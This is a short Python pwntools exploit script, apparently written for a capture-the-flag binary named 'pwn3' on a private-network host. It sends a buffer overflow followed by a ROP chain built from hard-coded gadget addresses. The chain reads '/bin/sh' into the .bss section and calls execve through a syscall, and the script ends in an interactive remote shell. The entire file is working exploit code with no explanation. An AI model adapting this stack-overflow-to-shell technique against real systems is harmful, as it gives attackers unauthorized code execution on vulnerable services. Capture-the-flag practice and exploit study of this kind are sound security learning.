#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2018-12-05 08:07:56
# @Author  : giantbranch (giantbranch@gmail.com)
# @Link    : http://www.giantbranch.cn/
# @tags : 

from pwn import *
context.log_level = "debug"
# p = process("./pwn3")
p = remote("192.168.3.21", 6066)
def getpid():
	print proc.pidof(p)[0]
	pause()

bss_addr = 0x00000000006CC442 

write_addr = 0x43F22D
read_addr = 0x43F1CD
# 0x00000000004014c6 : pop rdi ; ret
pop_rdi_ret = 0x00000000004014c6
# 0x00000000004015e7 : pop rsi ; ret
pop_rsi_ret = 0x00000000004015e7
# 0x0000000000442626 : pop rdx ; ret
pop_rdx_ret = 0x0000000000442626
syscall = 0x43F23F
# read(0, )
payload = "A" * 136 + p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) + p64(bss_addr) + p64(read_addr) + p64(pop_rdi_ret) + p64(bss_addr) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(syscall)
p.send(payload)
pause()
p.send("/bin/sh\x00" +  "A" * 51)
p.interactive()
